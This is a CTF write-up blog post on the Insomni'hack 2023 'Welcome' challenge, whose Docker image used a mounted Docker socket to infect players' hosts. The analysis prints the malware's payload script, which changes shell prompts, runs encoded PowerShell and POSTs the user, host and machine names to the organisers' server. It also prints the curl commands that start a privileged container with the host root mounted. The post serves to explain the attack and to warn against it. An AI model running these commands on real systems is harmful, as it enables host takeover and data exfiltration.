@@ -1,0 +1,347 @@
+---
+layout: post
+title: "Welcome ... to Questionable Ethics (Insomni'hack CTF 2023)"
+author: cryptax
+date: 2023-03-25
+tags:
+- Insomnihack
+- CTF
+- 2023
+- virus
+- ethics
+- Docker
+---
+
+*Actually, you're not that welcome... ;-) You'll understand why.*
+
+Update March 28, 2023. Solutions to protect your computer.
+
+# Description of the challenge
+
+*"Welcome to Insomnihack! No bruteforce is needed! Simply run the following command on the attached file, and wait for the flag (it should take up to 1 minute).
+`docker-compose up` 
+Have fun!"*
+
+The challenge also provided a `docker-compose.yml` file.
+
+```
+version: "3.9"
+services:
+  welcome:
+    image: welcome.insomnihack.ch/welcome_inso23-0
+    network_mode: "host"
+    volumes:
+      - '/var/run/docker.sock:/var/run/docker.sock'
+```
+
+There are 2 things I don't like in this file:
+
+1. **Network mode set to host**. This allows the containter to access any ports of the host.
+2. **Sharing `/var/run/docker.sock`**. This is a known security flaw. It gives `root` privileges to the container (because the owner of `/var/run/docker.socker` is root - see [stackoverflow](https://stackoverflow.com/questions/40844197/what-is-the-docker-security-risk-of-var-run-docker-sock)).
+
+**To be honest, I was more concerned by the first point than by the second**. I thought the socket would be used to convey the flag (we're in a CTF after all), whereas I didn't see any point in the first except stealthy actions.
+
+# (Bad) Solution
+
+The docker compose file retrieves a Docker container of Insomnihack. The challenge is as easy as it seems: you just have to run the command, wait a little and you'll get the flag:
+
+```
+$ docker-compose up
+Pulling welcome (welcome.insomnihack.ch/welcome_inso23-0:)...
+latest: Pulling from welcome_inso23-0
+63b65145d645: Pull complete
+0c7ac114858a: Pull complete
+7a854723d4a1: Pull complete
+371f835e9088: Pull complete
+Digest: sha256:3bb6419219e33e699c859737ee70fe50214cec41c8f6cc52acf7e7cf34704f06
+Status: Downloaded newer image for welcome.insomnihack.ch/welcome_inso23-0:latest
+Creating ins23_welcome_1 ... done
+Attaching to ins23_welcome_1
+welcome_1  | flag[0]=I
+welcome_1  | flag[1]=N
+welcome_1  | flag[2]=S
+welcome_1  | flag[3]={
+welcome_1  | flag[4]=7
+welcome_1  | flag[5]=H
+```
+
+The flag is long, so I decided to do some `sed` on the output to retrieve the flag: 
+
+- Erase everything before the equal sign: `sed -e 's/.*=//g' file`
+- Then I removed `\n` with a quick Python script. There is probably a better one-liner solution.
+
+```python
+>>> buf = open('welcome2.txt','r').read()
+>>> buf
+'I\nN\nS\n{\n7\nH\n4\nN\nK\n5\n_\nF\n0\nr\n-\n1\n3\n7\n7\n1\nN\n6\n_\nY\n0\nU\nr\n_\n5\n0\nC\nK\n3\n7\n.\n3\nX\nP\n0\n5\n3\nD\n!\n!\n}\n'
+>>> buf.replace('\n','')
+'INS{7H4NK5_F0r-13771N6_Y0Ur_50CK37.3XP053D!!}'
+```
+
+Then, we can flag with `INS{7H4NK5_F0r-13771N6_Y0Ur_50CK37.3XP053D!!}`.
+![](/images/ins23-welcome-flagged.png)
+
+By the way, the flag reminds us that sharing sockets is a bad idea:
+
+```
+      - '/var/run/docker.sock:/var/run/docker.sock'
+```
+
+# Shame
+
+After this, if you reboot, you'll have a bad surprise :(
+
+![Infected terminal by challenge author](/images/ins23-shame-infected.png)
+
+I will discuss the more than *borderline ethics* afterwards - see **Conclusion**.
+
+Let's get rid of this *crap* first.
+We easily locate the corresponding lines in the `~/.bashrc` file:
+
+![Infected .bashrc](/images/ins23-infected.png)
+
+But is it all? Let's check.
+In Docker images, we spot several `welcome.insomnihack.ch/welcome_inso23-44` and the culprit `welcome.insomnihack.ch/shame`.
+
+ ```
+$ docker images
+REPOSITORY                                     TAG                 IMAGE ID       CREATED         SIZE
+welcome.insomnihack.ch/shame                   latest              6998c3ece6a2   2 days ago      11.9MB
+welcome.insomnihack.ch/welcome_inso23-44       latest              764029acd9f4   2 days ago      13MB
+welcome.insomnihack.ch/welcome_inso23-43       latest              afd0edc6ce2e   2 days ago      13MB
+```
+
+We inspect the image with `docker image inspect welcome.insomnihack.ch/shame`:
+
+```json
+           "Data": {
+                "LowerDir": "/var/lib/docker/overlay2/1e2784c49c73b6baecf076714839ff70fdc386214cde86a4b3e595c2071ef98f/diff:/var/lib/docker/overlay2/9b48f754a46eaf565917648fafa91fc6d066310506fa8c59e9abb4c27ddf1dba/diff:/var/lib/docker/overlay2/1c48b2594afe24166bf485a1b4416c242586bbbf4aaad4971860ee975a0dd030/diff",
+                "MergedDir": "/var/lib/docker/overlay2/dbba8172b6851fa39220477106e292b569daf141928835acf1a5e835630eb8ae/merged",
+                "UpperDir": "/var/lib/docker/overlay2/dbba8172b6851fa39220477106e292b569daf141928835acf1a5e835630eb8ae/diff",
+                "WorkDir": "/var/lib/docker/overlay2/dbba8172b6851fa39220477106e292b569daf141928835acf1a5e835630eb8ae/work"
+            },
+```
+
+We are interested in the data directories which are going to hold the payload of the malware.
+With `tree /var/lib/docker/overlay2/1c48b2594afe24166bf485a1b4416c242586bbbf4aaad4971860ee975a0dd030/diff/usr`, we see the Docker image is based on Alpine:
+
+![](/images/ins23-shame-alpine.png)
+
+In another directory, we finally find the payload:
+
+```
+root@crocodile:/var/lib/docker/overlay2/dbba8172b6851fa39220477106e292b569daf141928835acf1a5e835630eb8ae/diff# ls -al
+total 20
+drwxr-xr-x 3 root root 4096 Mar 24 19:30 .
+drwx--x--- 4 root root 4096 Mar 24 19:30 ..
+drwxr-xr-x 2 root root 4096 Mar 24 16:47 etc
+-rwxrw-r-- 1 root root 5346 Mar 24 16:44 payload.sh
+```
+
+The `/etc` directory is empty. This is the content of `payload.sh`:
+
+```sh
+#!/bin/sh
+
+cat << "EOT" > "/host/payload"
+
+BASH CONTENT BLOB
+EOT
+
+chmod a+x "/host/payload"
+chroot "/host" "/payload"
+```
+
+This creates a `/host/payload` file with the following content until the "EOT" marker, then it marks the file as executable and runs it.
+
+The content of `/host/payload` is the following:
+
+```bash
+#!/bin/bash
+
+echo $SHELL
+
+SERVER="welcome.insomnihack.ch:4242"
+
+if [ -e "C:\Windows" ];then
+	# Windows
+	echo 'export PS1="\[\033[01;32m\]SHAME - You are infected $ \[\033[0m\]"' >> /etc/bash.bashrc
+	echo 'export PS1="\[\033[01;32m\]SHAME - You are infected \[\033[0m\]"' >> /etc/zsh/zshrc
+	curl -s "http://$SERVER/wallpaper.jpg?type=qLXfYey7yr5b" -o $TEMP/insomnihack.jpg
+	# Base64(UTF16-LE(payload))
+	powershell.exe -exec bypass -enc "YQBkAGQALQB0AHkAcABlACAAQAAnACAADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AUgB1AG4 [CUT] =" > /dev/null 2>&1
+else
+```
+
+If we are on Windows:
+
+1. Modify the Bash and Zsh prompt to the Infected shell prompt.
+2. Retrieve a wallpaper image and store it as `insomnihack.jpg`
+3. Run a Powershell command which is Base64 encoded.
+
+We decode the Base64 and get this command, which obviously modifies the system's wallpaper to an `insomnihack.png`
+
+```
+add-type @' 
+using System.Runtime.InteropServices; 
+namespace Win32{ 
+    
+     public class Wallpaper{ 
+        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
+         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
+         
+         public static void SetWallpaper(string thePath){ 
+            SystemParametersInfo(20,0,thePath,3); 
+         }
+    }
+ } 
+'@ | out-null
+[Win32.Wallpaper]::SetWallpaper("{0}\insomnihack.png" -f $ENV:TEMP) | out-null
+```
+
+Note: the script downloaded a JPG file, and it is setting a PNG file as wallpaper. Unless I missed something, I don't think this worked.
+
+If we are using Linux, we get in the following part of the script:
+
+![](/images/ins23-linux-script.png)
+
+It will only modify the Bash or ZSH prompt.
+
+The remaining part of the script is the following:
+
+```
+machine=`uname|base64`
+hostname=`hostname|base64`
+user=`whoami|base64`
+curl -s -o /dev/null -X POST -H 'Content-Type: application/json' -d "{\"titi\":\"1euy8gc9BPZMlQjMTCZ8\", \"u\":\"$user\", \"m\":\"$machine\", \"h\":\"$hostname\"}" "http://$SERVER/cRZbH6Mn8xUf"
+```
+
+This sends a POST JSON message to the Insomnihack server with: username, hostname and machine. That's very probably for their *Hall of Shame*.
+
+# How do we get the evil image?
+
+You may have noticed with `docker images | grep welcome` that we actually retrieved one Docker image per flag letter. Interesting. Let's inspect the last image, as it will probably download the shameful image.
+
+```
+$ docker images | grep welcome
+welcome.insomnihack.ch/shame                   latest              6998c3ece6a2   2 days ago      11.9MB
+welcome.insomnihack.ch/welcome_inso23-44       latest              764029acd9f4   2 days ago      13MB
+welcome.insomnihack.ch/welcome_inso23-43       latest              afd0edc6ce2e   2 days ago      13MB
+welcome.insomnihack.ch/welcome_inso23-42       latest              63bd03d7b3b3   2 days ago      13MB
+welcome.insomnihack.ch/welcome_inso23-41       latest              4a3974d674c0   2 days ago      13MB
+```
+
+Same as previously, post mortem, we inspect its data directory, in my personal case `/var/lib/docker/overlay2/f04922a1efa81159675daad8ebae64bab70800d87c05cab1a291b838b5db48b3/diff`. This directory contains an empty `etc` directory and a `start.sh` script.
+
+It prints the flag letter:
+
+```bash
+#!/bin/sh
+
+# To define to use this script:
+# IDX
+# IDX_PLUS_ONE
+# FLAG_LETTER 
+# IMG_NAME_PREFIX
+# Ex: IDX=0 FLAG_LETTER="I" IMG_NAME_PREFIX="Welcome_Inso23-" envsubst < start.sh.template
+
+# Print a flag's letter
+echo "flag[44]=}"
+```
+
+Then it pulls the next container and runs it. As there is no `welcome_inso23-45` Docker image, this won't work and stop by itself, but it explains the chain mechanism of pulling and running the next image:
+
+1. Pull and run `welcome_inso23-0` (this is performed by `docker-compose up` asked in the description)
+2. Display flag letter 0
+3. Pull and run `welcome_inso23-1`. Note that the Docker socket is used for that `--unix-socket /var/run/docker.sock`
+4. `welcome_inso23-1` displays flag letter 1
+5. Pull and run `welcome_inso23-2`
+6. Etc
+
+
+```bash
+# Pull the image from the registry
+curl --silent -XPOST --unix-socket /var/run/docker.sock "http://localhost/images/create?fromImage=welcome.insomnihack.ch/welcome_inso23-45&fromSrc=welcome.insomnihack.ch" > "/dev/null"
+
+# Create new container and save its ID
+curl --silent -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"welcome.insomnihack.ch/welcome_inso23-45\", \"HostConfig\":{\"Binds\":[\"/var/run/docker.sock:/var/run/docker.sock\"], \"NetworkMode\":\"host\"}}" -H 'Content-Type: application/json' "http://localhost/containers/create" | jq '.Id' | tr -d '\"' > /id_new_container
+
+#cat /id_new_container
+# Run the new container
+curl --silent -XPOST --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' http://localhost/containers/$(cat /id_new_container)/start > "/dev/null"
+
+# Wait for the child container to exit
+curl --silent -XPOST --unix-socket /var/run/docker.sock "http://localhost/containers/$(cat /id_new_container)/wait?condition=not-running" > "/dev/null"
+
+# Get the logs of the child container
+curl --silent --unix-socket /var/run/docker.sock "http://localhost/containers/$(cat /id_new_container)/logs?stdout=true" | grep -Eo "flag\[[0-9]+\]=."
+
+# Remove the child container
+# Remove the pulled image for the child container
+```
+
+Somewhere, one of the images needs to pull `welcome.insomnihack.ch/shame`. This is done in `welcome.insomnihack.ch/welcome_inso23-43` (the one just before the last character). In addition to printing `flag[43]` and downloading the next image, it also pulls and executes the shame image:
+
+```
+# Will be added to the start.sh script in one of the legit containers to also spawn an EVIL container pwning the user
+REGISTRY_NAME="welcome.insomnihack.ch"
+EVIL_IMG_NAME="shame"
+
+# Pull the EVIL image
+curl --silent -XPOST --unix-socket /var/run/docker.sock "http://localhost/images/create?fromImage=${REGISTRY_NAME}/${EVIL
+_IMG_NAME}&fromSrc=${REGISTRY_NAME}" > "/dev/null"
+
+# Based on https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/
+# Create the EVIL container with
+# --privileged
+# --net=host
+# --pid=host
+# --ipc=host
+# --volume /:/host
+curl --silent -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"${REGISTRY_NAME}/${EVIL_IMG_NAME}\", \"HostConfig\":{\"Privileged\":true, \"NetworkMode\":\"host\", \"PidMode\":\"host\", \"IpcMode\":\"host\", \"Binds\":[\"/:/host\"]}}
+" -H 'Content-Type: application/json' "http://localhost/containers/create" | jq '.Id' | tr -d '\"' > /id_evil_container
+
+# Start the EVIL container
+curl --silent -XPOST --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' "http://localhost/containers/$(cat /id_evil_container)/start" > "/dev/null"
+
+# The part below will block the execution and will not give the flag the to CTFers if an issue happens
+
+# Wait until the EVIL container exits
+# Delete the EVIL container
+# Delete the EVIL image
+```
+
+The script gives a link to [this page](https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/) which explains how to run a Docker container with full root capabilities, using `--privileged`, `--net=host`, `--pid=host`, `--ipc=host` and mounting `/`.
+
+# Solutions to protect your 
+
+*Added on March 28, 2023*
+
+I used to play CTFs out of a live CD of Kali. I no longer do because my laptop no longer has a CD player :wink:. It's possible to do the same off a USB key, but similarly, USB slots are grower scarce on laptops and you might not have one to spare.
+
+The solution is to play from a VM (e.g. VirtualBox), if your laptop is powerful enough not to make you feel the lag. So far, the few CTF players I know who use a VM do it because their laptop runs Windows and they prefer to play the CTF with Linux. But, if you can't trust the CTF you're in, it's probably a good idea to do it all the time :smile:. In CTFs like Hardwear.io or Ph0wn, you'll probably need access to a USB slot, so that's something you'll need to configure on the VM.
+
+Note: a Docker container wouldn't have worked. I'm not sure about Ubuntu's Multipass, and haven't ever used *nsjail*.
+
+
+# Conclusion
+
+The *Welcome* challenge was a warm-up challenge intended for CTF beginners.
+Solving it and getting the flag was *easy* and with only little interest.
+Post mortem investigation of how to plant a malware on participant's host was *far more interesting*.
+The author has certainly proved his point, that **sharing Docker sockets is a critical security risk**.
+Fortunately, the malicious payload didn't do anything worse than modify the shell prompt and the wallpaper. It could have been worse: thanks for stopping at this point ;P
+
+Yet, I profoundly **disagree with the ethics** in this case.
+
+1. **Easy victims.** This challenge was intended for beginners. A bit shameful to target them. I know the official goal was to teach the dangers of sharing Docker sockets. Is it really? Or is it to show off superiority? and make sure beginners don't feel welcome? That's perhaps the way they'll feel...
+
+2. **Trust.** In a CTF (and in a hacking conference in general), everybody knows to protect themselves **against other participants**. There are 700+ participants. When people buy a ticket, there isn't an ethics and moral check on them ;) However, we usually have to **trust the CTF organizers** (and reciprocally, they sometimes have to trust participants not to ruin their scoreboard). Indeed, in **numerous CTF challenges**, you have to download executables and reverse them. In multiple case, you'll also have to *execute them*. Who, in a CTF, checks absolutely the entire executable before running it? Who? Don't lie! **Nobody does because it takes too much time** and in a CTF, we are - by definition - short of time. When you get an executable, you reverse the flags that hold the flag. You can't afford to reverse all assembly lines to check it's not doing something illicit. Because of this, despite I had seen the socket sharing, I had chosen to *trust the challenge author*. I won't next time (but it might cost me a flag). Some will probably say I am a foul player and am just unhappy I got pwned. Well, yes, that's partly true. You are always disappointed when your trust was misplaced.
+
+3. **Malware creation.** This is something that many hackers and security researchers don't get. It is **not funny to create a new malware**. On Android alone, we have **10,000+ new samples per day**, and it's worse on Windows. Do you really think it is responsible just to add another one? It just gives Anti-Virus analysts (or Anti-Virus scripts) more work, wasting time on something meant to be "funny", and hence having less time to catch real cyber-criminals.
+
+
+> **Every time you create a "funny" malware, you play cyber-criminals game and help them infect your mother's laptop, your father's laptop, your aunt's laptop etc**.
+> I am pretty sure any Anti-Virus analyst will back me on this one.
+
+
